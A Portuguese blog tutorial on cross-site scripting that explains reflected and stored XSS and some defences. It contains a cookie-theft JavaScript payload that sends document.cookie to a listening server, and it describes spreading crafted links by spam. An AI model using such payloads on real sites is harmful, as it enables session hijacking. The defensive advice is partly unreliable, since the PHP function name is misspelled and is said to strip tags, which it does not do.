# Ataque XSS: Exemplo e 3 passos para entender como funciona o Cross-Site Scripting

O ataque XSS é um dos principais riscos de segurança de aplicações web. Nesse post você vai descobrir o que é e como ele funciona.

O ataque XSS é um dos principais riscos de segurança de aplicações web. Nesse post você vai descobrir o que é e como ele funciona.

De acordo com o [top 10 principais riscos de segurança de aplicações da web](https://owasp.org/www-project-top-ten/), pesquisa da OWASP (Projeto Aberto de Segurança em Aplicações Web), o ataque XSS é um das vulnerabilidades mais exploradas por hackers do mundo todo.

Além disso, vale ressaltar que até mesmo grandes sites da internet podem ser vulneráveis à ataques XSS. Um exemplo disso é uma falha que existia no [webmail da UOL](https://webmail.uol.com.br/), reportada pelo youtuber e especialista em segurança da informação [Gabriel Pato](https://www.youtube.com/watch?v=Ud-Z3vrJKTk).

Sendo assim, se você é um desenvolvedor web ou está iniciando na área, é essencial que você saiba como essa vulnerabilidade funciona. Nesse artigo, você descobrirá como esses ataques são feitos e como evitar que eles aconteçam nos seus sites.

## O que é um ataque XSS?

Como disse anteriormente, o **Cross-Site Scripting (XSS)** é uma das principais falhas presentes em sites e sistemas web. Com esse tipo de ataque, uma pessoa má intencionada pode conseguir **roubar a sessão de um usuário** (entrar na conta dele, mesmo sem ter usuário e senha), **fazer deface** em um website (alterar o conteúdo da página para uma foto dos anonymous é um dos mais famosos haha), roubar informações pessoais, redirecionar a pessoa para outro link e muito mais.

Existem dois principais tipos de ataques. São eles: **Reflected XSS**, e **Stored XSS**. Saiba mais sobre eles abaixo:

### **Reflected XSS**

Nesse tipo de ataque XSS, o hacker procura por um campo de pesquisa, por exemplo, ou uma página que aceite parâmetros, como: **www.exemplo.com.br/pesquisa.php?pesquisa=teste**

Alguns sites retornam essa busca na página, como por exemplo: “Você procurou por teste”, ou ainda “0 resultados para a palavra teste”.

Essa informação é renderizada no navegador pela linguagem de programação, como o PHP, por exemplo, e caso ela não seja tratada, o hacker pode executar códigos maliciosos no lugar do texto.

Segue abaixo um exemplo de ataque XSS reflected:

#### 1- O atacante encontra um formulário, como o de pesquisa do exemplo abaixo.

![img](https://devgabrielsouza.com.br/wp-content/uploads/2021/03/Ataque-XSS-via-formulario-de-pesquisa.jpg)Ataque XSS via formulário de pesquisa

Em seguida, o atacante verifica se o que ele pesquisou é mostrado de volta para o usuário. Caso positivo, ele sabe que talvez possa realizar um ataque XSS.

![img](https://devgabrielsouza.com.br/wp-content/uploads/2021/03/Ataque-XSS-via-formulario-de-pesquisa-renderizado.jpg)Ataque XSS resultado do formulário de pesquisa

#### 2 – A pessoa realiza teste com tag html para descobrir se o site é vulnerável à ataque XSS

Primeiramente, precisamos verificar se o campo do formulário envia tags HTML, e se na próxima página o navegador renderizará esse HTML. No exemplo abaixo, fazemos o teste direto com uma tag de script.

![img](https://devgabrielsouza.com.br/wp-content/uploads/2021/03/Passando-um-script-no-campo-de-pesquisa-de-um-site-para-tentativa-de-ataque-XSS.jpg)Teste de vulnerabilidade XSS em formulário de pesquisa

Se o site for vulnerável, na próxima página, o navegador deve emitir um alerta com a mensagem “teste”.

![img](https://devgabrielsouza.com.br/wp-content/uploads/2021/03/Vulnerabilidade-XSS.jpg)

E lá está o alerta! Isso significa que o site é vulnerável a XSS. Mas que tipo de ataque podemos fazer?

#### 3 – Realizando o ataque XSS

No exemplo abaixo, irei utilizar um código javascript que pega o cookie da vítima e “envia” para um servidor HTTP, com o cookie como parâmetro. Dessa forma, podemos ver no log do servidor qual foi a requisição HTTP feita pelo client.

![img](https://devgabrielsouza.com.br/wp-content/uploads/2021/03/Ataque-XSS-exemplo-de-roubo-de-cookie-1024x736.jpg)Roubo de cookie com ataque XSS

Nesse exemplo, nós iniciamos um servidor HTTP na porta 80. Qualquer requisição HTTP para nosso servidor (que no caso é o localhost), aparecerá no console para que possamos visualizar.

Dessa forma, eu faço a seguinte solicitação, pelo código javascript:

```
new Image().src="http:/localhost/?="+document.cookie
```

Com esse código, eu digo para o navegador carregar uma “imagem” com a url http:/localhost/ e com o parâmetro?cookie = **document.cookie**. A imagem não existe na url informada, obviamente, porém nosso servidor mantem o registro de todas as solicitações HTTP.

Dessa forma, conseguimos o código de sessão da vítima!

**Se você não sabe como funcionam as requisições HTTP, sugiro que leia o meu artigo sobre o assunto:**[ HTTP: Saiba o que é e como funciona](https://devgabrielsouza.com.br/ataque-xss/#)

![img](https://devgabrielsouza.com.br/wp-content/uploads/2021/03/cookie-capturado-pelo-XSS.jpg)Cookie capturado por XSS

Resumindo: nesse tipo de ataque, uma pessoa má intencionada encontra uma url com vulnerabilidade, cria um link com a url e o parâmetro (javascript) e envia para suas vítimas.

Geralmente esse tipo de ataque é feito em larga escala, sendo enviados email de spam para várias pessoas ao mesmo tempo, com a finalidade de que algumas cliquem no link e tenham seus dados expostos.

### Stored XSS

Nesse tipo de ataque XSS, o código javascript é **salvo no banco de dados**. Dessa forma, qualquer usuario que tentar acessar o site irá executar o código malicioso.

Um exemplo são campos de comentários. Se a pessoa comentar com um script js e o site não tiver as devidas medidas de segurança, o código pode ser executado sempre que alguém entrar na página.

Esse tipo de ataque é mais perigoso que o reflected, já que o código malicioso sempre será executado (até que alguem remova do banco de dados).

## Como se proteger de um ataque XSS

Para evitar esse tipo de ataque, você deve sempre prestar atenção antes de clicar em um link recebido. Para isso:

- Veja se existem tags html (<script>, <a>, <p>, etc) na url. Se houver, não clique no link!
- Se o link estiver encurtado, como por exemplo “bit.ly/link”, experimente abrí-lo em uma guia anônima, para previnir
- Dê preferência a sites que tenham certificado de segurança SSL (“site seguro”). Se o site não tiver o certificado, evite ficar navegando nele!
- Sempre atualize a versão do seu navegador de internet

## Como proteger seus sites de ataques XSS

Visto que os ataques XSS acontecem pela falta de validação dos dados pelo servidor, para evitar essas vulnerabilidades, **você deve controlar a entrada de dados nos formulários** (front-end) e também tratar esses dados no servidor (back-end).

Um exemplo de tratamento na linguagem de programação **PHP** é a utilização da função **htmlentites**(), que re**move todas as tags html** e converte as aspas duplas do texto:

```
htmlentites()
```

Dessa forma, quando a página carregar, o javascript do texto será ignorado e não executará. Porém, é importante que utilize outras formas de validação em conjunto, como por exemplo a utilização de tokens, entre outras medidas.

## Conclusão

Como pudemos ver nesse artigo, o cross-site scripting (xss) é uma falha extremamente grave, que permite até mesmo o acesso indevido à contas de outras pessoas. Portanto, é importante que todo desenvolvedor web saiba como ela funciona e como evitá-la.

E se você leu esse artigo do início ao fim, você já deve ter uma boa noção sobre XSS. ![😀](https://s.w.org/images/core/emoji/13.1.0/svg/1f600.svg)

Sendo assim, se esse artigo foi útil para você, compartilhe ele com seus amigos que tem interesse nessa área, talvez esse post possa ajudá-los também! Além disso, sintá-se a vontade para deixar sua opinião sobre esse assunto nos comentários!

## Leia também

[![Como aprender programação sozinho](https://devgabrielsouza.com.br/wp-content/uploads/2021/03/Dia-1-Capa-para-post-site-300x300.jpg)](https://devgabrielsouza.com.br/como-aprender-programacao-sozinho/)

## [Como aprender programação sozinho](https://devgabrielsouza.com.br/como-aprender-programacao-sozinho/)

5 de março de 2021 Nenhum comentário

Nesse artigo você verá porque e como aprender programação e como criar uma jornada sólida de estudos.